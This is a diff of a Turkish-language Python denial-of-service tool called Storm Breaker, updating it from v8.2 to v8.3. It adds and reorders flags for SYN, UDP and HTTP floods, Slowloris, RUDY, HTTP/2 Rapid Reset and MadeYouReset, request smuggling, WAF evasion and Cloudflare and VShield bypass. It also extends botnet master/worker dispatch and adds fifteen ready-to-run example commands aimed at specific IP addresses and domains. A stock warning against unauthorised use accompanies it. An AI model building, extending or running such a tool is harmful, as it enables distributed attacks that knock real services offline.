@@ -118,8 +118,8 @@ banner_text = """
 
 banner = Panel(
     banner_text,
-    title="[bold red]🌀 STORM BREAKER v8.2[/bold red]",
-    subtitle="[yellow]⚡ Advanced Layer7 + Master-Worker + Fuzz ⚡[/yellow]",
+    title="[bold red]🌀 STORM BREAKER v8.3[/bold red]",
+    subtitle="[yellow]⚡ Ultimate Stress Test Suite ⚡[/yellow]",
     border_style="blue",
     padding=(1, 2)
 )
@@ -131,7 +131,7 @@ console.print("[bold red]⚠️  İzinsiz kullanım yasa dışıdır ve ağır c
 # ------------------------------------------------------------
 # ARGÜMANLAR
 # ------------------------------------------------------------
-parser = argparse.ArgumentParser(description="StormBreaker v8.2 - Advanced Layer7 + Master-Worker", add_help=False)
+parser = argparse.ArgumentParser(description="StormBreaker v8.3 - Ultimate Stress Test Suite", add_help=False)
 parser.add_argument("--target", required=True, help="Hedef IP veya domain")
 parser.add_argument("--port", type=int, default=80, help="Tekil port (varsayılan: 80)")
 parser.add_argument("--port-range", help="Port aralığı (örn: 80,443,8080 veya 1-65535)")
@@ -139,63 +139,151 @@ parser.add_argument("--threads", type=int, default=100, help="Eşzamanlı thread
 parser.add_argument("--duration", type=int, default=30, help="Saldırı süresi (saniye)")
 parser.add_argument("--timeout", type=int, default=5, help="Bağlantı zaman aşımı")
 
-# Saldırı türleri
+# Temel saldırı türleri
+parser.add_argument("--layer4", action="store_true", help="SYN Flood (ağ katmanı)")
+parser.add_argument("--layer7", action="store_true", help="HTTP Flood (uygulama katmanı)")
+parser.add_argument("--udp", action="store_true", help="UDP Flood (DNS amplifikasyon)")
+parser.add_argument("--quality", action="store_true", help="Gelişmiş HTTP (Keep-Alive + POST)")
+parser.add_argument("--range", action="store_true", help="Range Header Abuse (büyük dosya parçalama)")
+parser.add_argument("--multipart", action="store_true", help="Multipart Form Flood (büyük form verisi)")
 parser.add_argument("--rapid-reset", action="store_true", help="HTTP/2 Rapid Reset")
-parser.add_argument("--desync", action="store_true", help="HTTP Desync")
-parser.add_argument("--range", action="store_true", help="Range Header Abuse")
-parser.add_argument("--multipart", action="store_true", help="Multipart Form Flood")
-parser.add_argument("--layer4", action="store_true", help="SYN Flood")
-parser.add_argument("--layer7", action="store_true", help="HTTP Flood")
-parser.add_argument("--quality", action="store_true", help="Gelişmiş HTTP")
-parser.add_argument("--udp", action="store_true", help="UDP Flood")
-parser.add_argument("--ai-mode", action="store_true", help="Otomatik strateji")
+parser.add_argument("--desync", action="store_true", help="HTTP Desync (Request Smuggling)")
+parser.add_argument("--ai-mode", action="store_true", help="Otomatik strateji seçimi (Cloudflare tespiti)")
+
+# Gelişmiş Layer7 metotları
+parser.add_argument("--rudy", action="store_true", help="RUDY (R-U-Dead-Yet) - Yavaş POST saldırısı")
+parser.add_argument("--madeyoureset", action="store_true", help="HTTP/2 MadeYouReset (CVE-2025-8671)")
+parser.add_argument("--fragmented", action="store_true", help="Fragmented HTTP - Parçalı istek, WAF atlatma")
+parser.add_argument("--advanced-cf-bypass", action="store_true", help="Gelişmiş Cloudflare Bypass (curl_cffi + oturum)")
+parser.add_argument("--fuzz", action="store_true", help="Özel protokol fuzzing (rastgele veri gönder)")
+parser.add_argument("--slowloris", action="store_true", help="Slowloris - Bağlantıları açık tut")
 
 # Bypass modülleri
-parser.add_argument("--cf-uam", action="store_true", help="Cloudflare Under Attack Mode Bypass")
 parser.add_argument("--cfb", action="store_true", help="Cloudflare Normal Bypass")
-parser.add_argument("--vshield", action="store_true", help="VShield Bypass")
+parser.add_argument("--cf-uam", action="store_true", help="Cloudflare Under Attack Mode Bypass")
+parser.add_argument("--vshield", action="store_true", help="VShield Bypass (özel header + proxy)")
 
-# Yeni Layer7 metotları
-parser.add_argument("--rudy", action="store_true", help="RUDY (R-U-Dead-Yet)")
-parser.add_argument("--madeyoureset", action="store_true", help="HTTP/2 MadeYouReset (CVE-2025-8671)")
-parser.add_argument("--fragmented", action="store_true", help="Fragmented HTTP - Parçalı istek")
-parser.add_argument("--advanced-cf-bypass", action="store_true", help="Gelişmiş Cloudflare Bypass")
-parser.add_argument("--fuzz", action="store_true", help="Özel protokol fuzzing (rastgele veri gönder)")
-parser.add_argument("--slowloris", action="store_true", help="Slowloris (bağlantıları açık tut)")
-
-# Master-Worker
+# Master-Worker (Dağıtık saldırı)
 parser.add_argument("--master", action="store_true", help="Botnet Master olarak çalıştır")
 parser.add_argument("--worker", action="store_true", help="Botnet Worker olarak çalıştır")
 parser.add_argument("--master-ip", help="Worker'ın bağlanacağı Master IP")
 
-# Proxy
-parser.add_argument("--update-proxies", action="store_true", help="ProxyScrape'ten güncel proxy indir")
-parser.add_argument("--proxy-sources", default="http,https,socks4,socks5", help="Proxy protokolleri")
-parser.add_argument("--proxy-list", metavar="DOSYA", help="Proxy listesi dosyası")
-parser.add_argument("--proxy-type", default="http", help="Proxy tipi")
+# Proxy seçenekleri
+parser.add_argument("--update-proxies", action="store_true", help="ProxyScrape'ten güncel proxy listesini indir")
+parser.add_argument("--proxy-sources", default="http,https,socks4,socks5", help="İndirilecek proxy türleri (varsayılan: http,https,socks4,socks5)")
+parser.add_argument("--proxy-list", metavar="DOSYA", help="Kendi proxy listeni kullan (dosya yolu)")
+parser.add_argument("--proxy-type", default="http", help="Proxy tipi (http/https/socks4/socks5)")
 
 # Raporlama
 parser.add_argument("--report", metavar="DOSYA", help="Sonuçları JSON olarak kaydet")
-parser.add_argument("--verbose", action="store_true", help="Detaylı log")
+parser.add_argument("--verbose", action="store_true", help="Detaylı log (her isteğin durumunu göster)")
 
 # ------------------------------------------------------------
-# YARDIM MESAJI
+# YARDIM MESAJI (TÜM ARGÜMANLAR + ÖRNEKLER)
 # ------------------------------------------------------------
 def print_help_with_examples():
-    console.print("[bold cyan]📖 STORM BREAKER v8.2 - KULLANIM KILAVUZU[/bold cyan]\n")
-    console.print("[bold yellow]🔹 YENİ METOTLAR:[/bold yellow]")
-    console.print("  --fuzz        → Özel protokol fuzzing (rastgele veri gönder)")
-    console.print("  --slowloris   → Slowloris (bağlantıları açık tut)\n")
+    console.print("[bold cyan]📖 STORM BREAKER v8.3 - KULLANIM KILAVUZU[/bold cyan]\n")
+    
+    console.print("[bold yellow]🔹 ZORUNLU ARGÜMANLAR:[/bold yellow]")
+    console.print("  --target HEDEF       → Hedef IP veya domain (ZORUNLU)\n")
+    
+    console.print("[bold yellow]🔹 PORT SEÇENEKLERİ:[/bold yellow]")
+    console.print("  --port PORT          → Tekil port (varsayılan: 80)")
+    console.print("  --port-range ARALIK  → Port aralığı (örn: 80,443,8080 veya 1-65535)\n")
+    
+    console.print("[bold yellow]🔹 SÜRE VE PERFORMANS:[/bold yellow]")
+    console.print("  --threads SAYI       → Eşzamanlı thread sayısı (varsayılan: 100)")
+    console.print("  --duration SANIYE    → Saldırı süresi (varsayılan: 30)")
+    console.print("  --timeout SANIYE     → Bağlantı zaman aşımı (varsayılan: 5)\n")
+    
+    console.print("[bold yellow]🔹 TEMEL SALDIRI METOTLARI:[/bold yellow]")
+    console.print("  --layer4        → SYN Flood (ağ katmanı)")
+    console.print("  --layer7        → HTTP Flood (uygulama katmanı)")
+    console.print("  --udp           → UDP Flood (DNS amplifikasyon)")
+    console.print("  --quality       → Gelişmiş HTTP (Keep-Alive + POST)")
+    console.print("  --range         → Range Header Abuse (büyük dosya parçalama)")
+    console.print("  --multipart     → Multipart Form Flood (büyük form verisi)")
+    console.print("  --rapid-reset   → HTTP/2 Rapid Reset")
+    console.print("  --desync        → HTTP Desync (Request Smuggling)")
+    console.print("  --ai-mode       → Otomatik strateji seçimi (Cloudflare tespiti)\n")
+    
+    console.print("[bold yellow]🔹 GELİŞMİŞ LAYER7 METOTLARI:[/bold yellow]")
+    console.print("  --rudy               → RUDY (R-U-Dead-Yet) – Yavaş POST saldırısı")
+    console.print("  --madeyoureset       → HTTP/2 MadeYouReset (CVE-2025-8671)")
+    console.print("  --fragmented         → Fragmented HTTP – Parçalı istek, WAF atlatma")
+    console.print("  --advanced-cf-bypass → Gelişmiş Cloudflare Bypass (curl_cffi + oturum)")
+    console.print("  --fuzz               → Özel protokol fuzzing (rastgele veri gönder)")
+    console.print("  --slowloris          → Slowloris – Bağlantıları açık tut\n")
+    
+    console.print("[bold yellow]🔹 BYPASS MODÜLLERİ:[/bold yellow]")
+    console.print("  --cfb           → Cloudflare Normal Bypass")
+    console.print("  --cf-uam        → Cloudflare Under Attack Mode Bypass")
+    console.print("  --vshield       → VShield Bypass (özel header + proxy)\n")
+    
     console.print("[bold yellow]🔹 MASTER-WORKER (DAĞITIK SALDIRI):[/bold yellow]")
     console.print("  --master              → Master olarak çalıştır")
     console.print("  --worker              → Worker olarak çalıştır")
     console.print("  --master-ip IP        → Worker'ın bağlanacağı Master IP\n")
-    console.print("[green]Örnek (Master):[/green]")
+    
+    console.print("[bold yellow]🔹 PROXY SEÇENEKLERİ:[/bold yellow]")
+    console.print("  --update-proxies        → ProxyScrape'ten güncel proxy listesini indir")
+    console.print("  --proxy-sources TÜR     → İndirilecek proxy türleri (varsayılan: http,https,socks4,socks5)")
+    console.print("  --proxy-list DOSYA      → Kendi proxy listeni kullan")
+    console.print("  --proxy-type TÜR        → Proxy tipi (http/https/socks4/socks5)\n")
+    
+    console.print("[bold yellow]🔹 RAPORLAMA:[/bold yellow]")
+    console.print("  --report DOSYA      → Sonuçları JSON olarak kaydet")
+    console.print("  --verbose           → Detaylı log (her isteğin durumunu göster)\n")
+    
+    console.print("[bold yellow]📌 ÖRNEK KULLANIMLAR:[/bold yellow]")
+    
+    console.print("[green]1. HTTP Flood (Layer7) – Tekil port:[/green]")
+    console.print("  python storm.py --target 141.95.95.185 --port 30001 --layer7 --update-proxies --threads 200 --duration 60\n")
+    
+    console.print("[green]2. SYN Flood (Layer4) – Port aralığı:[/green]")
+    console.print("  python storm.py --target 141.95.95.185 --port-range 80,443,8080 --layer4 --update-proxies --threads 100 --duration 30\n")
+    
+    console.print("[green]3. Desync (Request Smuggling) – SOCKS5 proxy ile:[/green]")
+    console.print("  python storm.py --target 141.95.95.185 --port 30001 --desync --update-proxies --proxy-sources socks5 --threads 300 --duration 60\n")
+    
+    console.print("[green]4. Fragmented HTTP – WAF atlatma:[/green]")
+    console.print("  python storm.py --target 141.95.95.185 --port 30001 --fragmented --update-proxies --threads 200 --duration 60\n")
+    
+    console.print("[green]5. Fuzzing (Özel protokol):[/green]")
+    console.print("  python storm.py --target 141.95.95.185 --port 30001 --fuzz --update-proxies --threads 200 --duration 60\n")
+    
+    console.print("[green]6. Slowloris – Bağlantı havuzunu doldur:[/green]")
+    console.print("  python storm.py --target 141.95.95.185 --port 30001 --slowloris --update-proxies --threads 200 --duration 60\n")
+    
+    console.print("[green]7. Cloudflare Normal Bypass (CFB):[/green]")
+    console.print("  python storm.py --target graph.vshield.pro --port 443 --cfb --update-proxies --threads 200 --duration 30\n")
+    
+    console.print("[green]8. Cloudflare Under Attack Mode Bypass (CF-UAM):[/green]")
+    console.print("  python storm.py --target uam.doffybee.com --port 443 --cf-uam --update-proxies --threads 200 --duration 30\n")
+    
+    console.print("[green]9. VShield Bypass:[/green]")
+    console.print("  python storm.py --target graph.vshield.pro --port 443 --vshield --update-proxies --threads 100 --duration 30\n")
+    
+    console.print("[green]10. AI Modu – Otomatik strateji:[/green]")
+    console.print("  python storm.py --target graph.vshield.pro --port 443 --ai-mode --update-proxies --threads 200 --duration 30\n")
+    
+    console.print("[green]11. Master (Komut gönderen):[/green]")
     console.print("  python storm.py --master --target 141.95.95.185 --port 30001 --desync --threads 500 --duration 120\n")
-    console.print("[green]Örnek (Worker):[/green]")
+    
+    console.print("[green]12. Worker (Saldıran):[/green]")
     console.print("  python storm.py --worker --master-ip 192.168.1.100\n")
-    console.print("[bold yellow]🔹 DİĞER SALDIRILAR:[/bold yellow]")
-    console.print("  --layer7, --layer4, --desync, --fragmented, --rudy, --madeyoureset, --cfb, --cf-uam, --vshield, --ai-mode\n")
+    
+    console.print("[green]13. RUDY (Yavaş POST):[/green]")
+    console.print("  python storm.py --target example.com --port 80 --rudy --update-proxies --threads 100 --duration 30\n")
+    
+    console.print("[green]14. MadeYouReset (HTTP/2 CVE):[/green]")
+    console.print("  python storm.py --target example.com --port 443 --madeyoureset --update-proxies --threads 200 --duration 30\n")
+    
+    console.print("[green]15. Advanced Cloudflare Bypass:[/green]")
+    console.print("  python storm.py --target graph.vshield.pro --port 443 --advanced-cf-bypass --update-proxies --threads 200 --duration 30\n")
+    
+    console.print("[bold red]⚠️  UYARI: Bu araç yalnızca izinli test ortamlarında kullanılmalıdır![/bold red]")
+    console.print("[bold red]⚠️  İzinsiz kullanım yasa dışıdır ve ağır cezaları vardır.[/bold red]")
     sys.exit(0)
 
 if "-h" in sys.argv or "--help" in sys.argv:
@@ -352,6 +440,18 @@ def start_worker(master_ip):
             fuzzing_attack(target, int(port), int(duration), int(threads))
         elif attack_type == "slowloris":
             slowloris_attack(target, int(port), int(duration), int(threads))
+        elif attack_type == "rudy":
+            rudy_attack(target, int(port), int(duration), int(threads))
+        elif attack_type == "madeyoureset":
+            madeyoureset_attack(target, int(port), int(duration), int(threads))
+        elif attack_type == "rapid_reset":
+            rapid_reset_attack(target, int(port), int(duration), int(threads))
+        elif attack_type == "range":
+            range_attack(target, int(port), int(duration), int(threads))
+        elif attack_type == "multipart":
+            multipart_attack(target, int(port), int(duration), int(threads))
+        elif attack_type == "quality":
+            http_flood(target, int(port), int(duration), int(threads))
     except Exception as e:
         console.print(f"[red]✗ Worker hatası: {e}[/red]")
 
@@ -1025,7 +1125,7 @@ def vshield_bypass(target, port, duration, threads):
     for t in threads_list: t.join(timeout=1)
     if stop_flag: return {"success": success, "failed": failed, "rps": success/duration}
     console.print(f"[green]✓ VShield Bypass tamamlandı. Başarılı: {success}, Başarısız: {failed}[/green]")
-    return {"success": success, "failed": failed, "rps": success / duration
+    return {"success": success, "failed": failed, "rps": success / duration}  # <-- Eksik süslü parantez düzeltildi
 
 # ------------------------------------------------------------
 # CANLI İSTATİSTİK PANELİ
@@ -1101,6 +1201,16 @@ def main():
             attack_type = "fuzz"
         elif args.slowloris:
             attack_type = "slowloris"
+        elif args.rudy:
+            attack_type = "rudy"
+        elif args.madeyoureset:
+            attack_type = "madeyoureset"
+        elif args.rapid_reset:
+            attack_type = "rapid_reset"
+        elif args.range:
+            attack_type = "range"
+        elif args.multipart:
+            attack_type = "multipart"
         start_master(args.target, int(args.port), attack_type, args.duration, args.threads)
         sys.exit(0)
 
